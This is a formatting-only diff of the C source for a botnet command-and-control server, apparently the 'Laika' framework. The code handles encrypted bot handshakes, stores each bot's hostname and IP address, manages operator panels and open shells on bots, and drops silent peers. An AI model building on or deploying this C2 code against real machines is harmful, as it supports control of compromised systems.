@@ -1,57 +1,61 @@
-#include "lmem.h"
-#include "lsodium.h"
-#include "lsocket.h"
-#include "lerror.h"
-#include "ltask.h"
+#include "cnc.h"
 
 #include "cpanel.h"
 #include "cpeer.h"
-#include "cnc.h"
+#include "lerror.h"
+#include "lmem.h"
+#include "lsocket.h"
+#include "lsodium.h"
+#include "ltask.h"
 
 /* ======================================[[ PeerHashMap ]]======================================= */
 
-typedef struct sCNC_PeerHashElem {
+typedef struct sCNC_PeerHashElem
+{
     struct sLaika_peer *peer;
     uint8_t *pub;
 } tCNC_PeerHashElem;
 
-int cnc_PeerElemCompare(const void *a, const void *b, void *udata) {
+int cnc_PeerElemCompare(const void *a, const void *b, void *udata)
+{
     const tCNC_PeerHashElem *ua = a;
     const tCNC_PeerHashElem *ub = b;
 
-    return memcmp(ua->pub, ub->pub, crypto_kx_PUBLICKEYBYTES); 
+    return memcmp(ua->pub, ub->pub, crypto_kx_PUBLICKEYBYTES);
 }
 
-uint64_t cnc_PeerElemHash(const void *item, uint64_t seed0, uint64_t seed1) {
+uint64_t cnc_PeerElemHash(const void *item, uint64_t seed0, uint64_t seed1)
+{
     const tCNC_PeerHashElem *u = item;
-    return *(uint64_t*)(u->pub); /* hashes pub key (first 8 bytes) */
+    return *(uint64_t *)(u->pub); /* hashes pub key (first 8 bytes) */
 }
 
 /* ====================================[[ Packet Handlers ]]==================================== */
 
-bool checkPeerKey(struct sLaika_peer *peer, void *uData) {
+bool checkPeerKey(struct sLaika_peer *peer, void *uData)
+{
     if (sodium_memcmp(peer->peerPub, uData, crypto_kx_PUBLICKEYBYTES) == 0)
         LAIKA_ERROR("public key is already in use!\n");
 
     return true;
 }
 
-void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
     char magicBuf[LAIKA_MAGICLEN];
-    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
+    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
     struct sLaika_cnc *cnc = pInfo->cnc;
     char *tempIPBuf;
     uint8_t major, minor;
 
-    laikaS_read(&peer->sock, (void*)magicBuf, LAIKA_MAGICLEN);
+    laikaS_read(&peer->sock, (void *)magicBuf, LAIKA_MAGICLEN);
     major = laikaS_readByte(&peer->sock);
     minor = laikaS_readByte(&peer->sock);
     peer->osType = laikaS_readByte(&peer->sock);
     peer->type = PEER_BOT;
 
-    if (memcmp(magicBuf, LAIKA_MAGIC, LAIKA_MAGICLEN) != 0
-        || major != LAIKA_VERSION_MAJOR
-        || minor != LAIKA_VERSION_MINOR)
+    if (memcmp(magicBuf, LAIKA_MAGIC, LAIKA_MAGICLEN) != 0 || major != LAIKA_VERSION_MAJOR ||
+        minor != LAIKA_VERSION_MINOR)
         LAIKA_ERROR("invalid handshake request!\n");
 
     /* read peer's public key */
@@ -61,15 +65,17 @@ void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, v
     laikaS_read(&peer->sock, peer->hostname, LAIKA_HOSTNAME_LEN);
     laikaS_read(&peer->sock, peer->inet, LAIKA_INET_LEN);
 
-    /* check and make sure there's not already a peer with the same key (might throw an LAIKA_ERROR, which will kill the peer) */
-    laikaC_iterPeers(cnc, checkPeerKey, (void*)peer->peerPub);
+    /* check and make sure there's not already a peer with the same key (might throw an LAIKA_ERROR,
+     * which will kill the peer) */
+    laikaC_iterPeers(cnc, checkPeerKey, (void *)peer->peerPub);
 
     /* restore null-terminator */
-    peer->hostname[LAIKA_HOSTNAME_LEN-1] = '\0';
-    peer->inet[LAIKA_INET_LEN-1] = '\0';
+    peer->hostname[LAIKA_HOSTNAME_LEN - 1] = '\0';
+    peer->inet[LAIKA_INET_LEN - 1] = '\0';
 
     /* gen session keys */
-    if (crypto_kx_server_session_keys(peer->inKey, peer->outKey, cnc->pub, cnc->priv, peer->peerPub) != 0)
+    if (crypto_kx_server_session_keys(peer->inKey, peer->outKey, cnc->pub, cnc->priv,
+                                      peer->peerPub) != 0)
         LAIKA_ERROR("failed to gen session key!\n");
 
     /* encrypt all future packets */
@@ -86,8 +92,9 @@ void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, v
     LAIKA_DEBUG("accepted handshake from peer %p\n", peer);
 }
 
-void laikaC_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
-    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
+void laikaC_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
+    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
 
     pInfo->lastPing = laikaT_getTime();
     laikaS_emptyOutPacket(peer, LAIKAPKT_PINGPONG); /* gg 2 ez */
@@ -145,11 +152,13 @@ struct sLaika_peerPacketInfo laikaC_authPktTbl[LAIKAPKT_MAXNONE] = {
 
 /* ==========================================[[ CNC ]]========================================== */
 
-struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
+struct sLaika_cnc *laikaC_newCNC(uint16_t port)
+{
     struct sLaika_cnc *cnc = laikaM_malloc(sizeof(struct sLaika_cnc));
 
     /* init peer hashmap & panel list */
-    cnc->peers = hashmap_new(sizeof(tCNC_PeerHashElem), 8, 0, 0, cnc_PeerElemHash, cnc_PeerElemCompare, NULL, NULL);
+    cnc->peers = hashmap_new(sizeof(tCNC_PeerHashElem), 8, 0, 0, cnc_PeerElemHash,
+                             cnc_PeerElemCompare, NULL, NULL);
     cnc->authPeers = NULL;
     cnc->authKeys = NULL;
     cnc->authKeysCount = 0;
@@ -158,8 +167,8 @@ struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
     cnc->authPeersCount = 0;
     cnc->port = port;
 
-    /* init socket & pollList */
-    laikaS_initSocket(&cnc->sock, NULL, NULL, NULL, NULL); /* we just need it for the raw socket fd and abstracted API :) */
+    /* init socket (we just need it for the raw socket fd and abstracted API :P) & pollList */
+    laikaS_initSocket(&cnc->sock, NULL, NULL, NULL, NULL);
     laikaP_initPList(&cnc->pList);
 
     if (sodium_init() < 0) {
@@ -178,7 +187,8 @@ struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
     return cnc;
 }
 
-void laikaC_bindServer(struct sLaika_cnc *cnc) {
+void laikaC_bindServer(struct sLaika_cnc *cnc)
+{
     /* bind sock to port */
     laikaS_bind(&cnc->sock, cnc->port);
 
@@ -186,7 +196,8 @@ void laikaC_bindServer(struct sLaika_cnc *cnc) {
     laikaP_addSock(&cnc->pList, &cnc->sock);
 }
 
-void laikaC_freeCNC(struct sLaika_cnc *cnc) {
+void laikaC_freeCNC(struct sLaika_cnc *cnc)
+{
     int i;
 
     laikaS_cleanSocket(&cnc->sock);
@@ -201,7 +212,8 @@ void laikaC_freeCNC(struct sLaika_cnc *cnc) {
     laikaM_free(cnc);
 }
 
-void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
+void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer)
+{
     int i;
     GETPINFOFROMPEER(peer)->completeHandshake = true;
 
@@ -218,7 +230,8 @@ void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
     hashmap_set(cnc->peers, &(tCNC_PeerHashElem){.pub = peer->peerPub, .peer = peer});
 }
 
-void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
+void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer)
+{
     int i;
 
     /* ignore uninitalized peers */
@@ -228,16 +241,17 @@ void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
     /* close any open shells */
     laikaC_closeShells(peer);
     switch (peer->type) {
-        case PEER_BOT: {
-            /* TODO */
-            break;
-        }
-        case PEER_AUTH: {
-            /* remove peer from panels list */
-            laikaC_rmvAuth(cnc, peer);
-            break;
-        }
-        default: break;
+    case PEER_BOT: {
+        /* TODO */
+        break;
+    }
+    case PEER_AUTH: {
+        /* remove peer from panels list */
+        laikaC_rmvAuth(cnc, peer);
+        break;
+    }
+    default:
+        break;
     }
 
     /* notify connected panels of the disconnected peer */
@@ -249,7 +263,8 @@ void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
     hashmap_delete(cnc->peers, &(tCNC_PeerHashElem){.pub = peer->peerPub, .peer = peer});
 }
 
-void laikaC_setPeerType(struct sLaika_cnc *cnc, struct sLaika_peer *peer, PEERTYPE type) {
+void laikaC_setPeerType(struct sLaika_cnc *cnc, struct sLaika_peer *peer, PEERTYPE type)
+{
     /* make sure to update connected peers */
     laikaC_onRmvPeer(cnc, peer);
 
@@ -259,26 +274,28 @@ void laikaC_setPeerType(struct sLaika_cnc *cnc, struct sLaika_peer *peer, PEERTY
     /* update accepted packets */
     peer->type = type;
     switch (type) {
-        case PEER_AUTH:
-            peer->packetTbl = laikaC_authPktTbl;
-            peer->uData = laikaC_newAuthInfo(cnc);
-            break;
-        case PEER_BOT:
-            peer->packetTbl = laikaC_botPktTbl;
-            peer->uData = laikaC_newBotInfo(cnc);
-            break;
-        default:
-            LAIKA_ERROR("laikaC_setPeerType: invalid peerType!\n");
-            break;
+    case PEER_AUTH:
+        peer->packetTbl = laikaC_authPktTbl;
+        peer->uData = laikaC_newAuthInfo(cnc);
+        break;
+    case PEER_BOT:
+        peer->packetTbl = laikaC_botPktTbl;
+        peer->uData = laikaC_newBotInfo(cnc);
+        break;
+    default:
+        LAIKA_ERROR("laikaC_setPeerType: invalid peerType!\n");
+        break;
     }
 
     /* a new (but not-so-new) peer has arrived */
     laikaC_onAddPeer(cnc, peer);
 }
 
-void laikaC_addAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer) {
+void laikaC_addAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer)
+{
     /* grow array if we need to */
-    laikaM_growarray(struct sLaika_peer*, cnc->authPeers, 1, cnc->authPeersCount, cnc->authPeersCap);
+    laikaM_growarray(struct sLaika_peer *, cnc->authPeers, 1, cnc->authPeersCount,
+                     cnc->authPeersCap);
 
     /* insert into authenticated peer table */
     cnc->authPeers[cnc->authPeersCount++] = authPeer;
@@ -286,7 +303,8 @@ void laikaC_addAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer) {
     LAIKA_DEBUG("added panel %p!\n", authPeer);
 }
 
-void laikaC_rmvAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer) {
+void laikaC_rmvAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer)
+{
     int i;
 
     for (i = 0; i < cnc->authPeersCount; i++) {
@@ -297,9 +315,10 @@ void laikaC_rmvAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer) {
     }
 }
 
-void laikaC_addAuthKey(struct sLaika_cnc *cnc, const char *key) {
+void laikaC_addAuthKey(struct sLaika_cnc *cnc, const char *key)
+{
     uint8_t *buf;
-    laikaM_growarray(uint8_t*, cnc->authKeys, 1, cnc->authKeysCount, cnc->authKeysCap);
+    laikaM_growarray(uint8_t *, cnc->authKeys, 1, cnc->authKeysCount, cnc->authKeysCap);
 
     buf = laikaM_malloc(crypto_kx_PUBLICKEYBYTES);
     if (!laikaK_loadKeys(buf, NULL, key, NULL))
@@ -310,27 +329,30 @@ void laikaC_addAuthKey(struct sLaika_cnc *cnc, const char *key) {
     printf("[~] Added authenticated public key '%s'\n", key);
 }
 
-void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
+void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer)
+{
     laikaC_onRmvPeer(cnc, peer);
 
     /* free peerInfo if it's defined */
     if (peer->uData)
         laikaC_freePeerInfo(peer, peer->uData);
 
-    laikaP_rmvSock(&cnc->pList, (struct sLaika_socket*)peer);
+    laikaP_rmvSock(&cnc->pList, (struct sLaika_socket *)peer);
     laikaS_freePeer(peer);
 
     LAIKA_DEBUG("peer %p killed!\n", peer);
 }
 
 /* socket event */
-void laikaC_onPollFail(struct sLaika_socket *sock, void *uData) {
-    struct sLaika_peer *peer = (struct sLaika_peer*)sock;
-    struct sLaika_cnc *cnc = (struct sLaika_cnc*)uData;
+void laikaC_onPollFail(struct sLaika_socket *sock, void *uData)
+{
+    struct sLaika_peer *peer = (struct sLaika_peer *)sock;
+    struct sLaika_cnc *cnc = (struct sLaika_cnc *)uData;
     laikaC_killPeer(cnc, peer);
 }
 
-bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
+bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout)
+{
     struct sLaika_peer *peer;
     struct sLaika_pollEvent *evnts, *evnt;
     int numEvents, i;
@@ -347,13 +369,8 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
     for (i = 0; i < numEvents; i++) {
         evnt = &evnts[i];
         if (evnt->sock == &cnc->sock) { /* event on listener? */
-            peer = laikaS_newPeer(
-                laikaC_botPktTbl,
-                &cnc->pList,
-                laikaC_onPollFail,
-                cnc,
-                (void*)laikaC_newBotInfo(cnc)
-            );
+            peer = laikaS_newPeer(laikaC_botPktTbl, &cnc->pList, laikaC_onPollFail, cnc,
+                                  (void *)laikaC_newBotInfo(cnc));
 
             LAIKA_TRY
                 /* setup and accept new peer */
@@ -379,15 +396,18 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
     return true;
 }
 
-struct sLaika_peer *laikaC_getPeerByPub(struct sLaika_cnc *cnc, uint8_t *pub) {
-    tCNC_PeerHashElem *elem = (tCNC_PeerHashElem*)hashmap_get(cnc->peers, &(tCNC_PeerHashElem){.pub = pub});
+struct sLaika_peer *laikaC_getPeerByPub(struct sLaika_cnc *cnc, uint8_t *pub)
+{
+    tCNC_PeerHashElem *elem =
+        (tCNC_PeerHashElem *)hashmap_get(cnc->peers, &(tCNC_PeerHashElem){.pub = pub});
 
     return elem ? elem->peer : NULL;
 }
 
-bool sweepPeers(struct sLaika_peer *peer, void *uData) {
+bool sweepPeers(struct sLaika_peer *peer, void *uData)
+{
     struct sLaika_peerInfo *pInfo = GETPINFOFROMPEER(peer);
-    struct sLaika_cnc *cnc = (struct sLaika_cnc*)uData;
+    struct sLaika_cnc *cnc = (struct sLaika_cnc *)uData;
     long currTime = laikaT_getTime();
 
     /* peer has been silent for a while, kill 'em */
@@ -399,33 +419,38 @@ bool sweepPeers(struct sLaika_peer *peer, void *uData) {
     return true;
 }
 
-void laikaC_sweepPeersTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
-    struct sLaika_cnc *cnc = (struct sLaika_cnc*)uData;
+void laikaC_sweepPeersTask(struct sLaika_taskService *service, struct sLaika_task *task,
+                           clock_t currTick, void *uData)
+{
+    struct sLaika_cnc *cnc = (struct sLaika_cnc *)uData;
 
-    laikaC_iterPeers(cnc, sweepPeers, (void*)cnc);
+    laikaC_iterPeers(cnc, sweepPeers, (void *)cnc);
 }
 
 /* =======================================[[ Peer Iter ]]======================================= */
 
-struct sWrapperData {
+struct sWrapperData
+{
     tLaika_peerIter iter;
     void *uData;
 };
 
 /* wrapper iterator */
-bool iterWrapper(const void *rawItem, void *uData) {
-    struct sWrapperData *data = (struct sWrapperData*)uData;
-    tCNC_PeerHashElem *item = (tCNC_PeerHashElem*)rawItem;
+bool iterWrapper(const void *rawItem, void *uData)
+{
+    struct sWrapperData *data = (struct sWrapperData *)uData;
+    tCNC_PeerHashElem *item = (tCNC_PeerHashElem *)rawItem;
     return data->iter(item->peer, data->uData);
 }
 
-void laikaC_iterPeers(struct sLaika_cnc *cnc, tLaika_peerIter iter, void *uData) {
+void laikaC_iterPeers(struct sLaika_cnc *cnc, tLaika_peerIter iter, void *uData)
+{
     struct sWrapperData wrapper;
     wrapper.iter = iter;
     wrapper.uData = uData;
 
     /* iterate over hashmap calling our iterWrapper, pass the *real* iterator to
-        itemWrapper so that it can call it. probably a better way to do this 
+        itemWrapper so that it can call it. probably a better way to do this
         but w/e lol */
     hashmap_scan(cnc->peers, iterWrapper, &wrapper);
 }
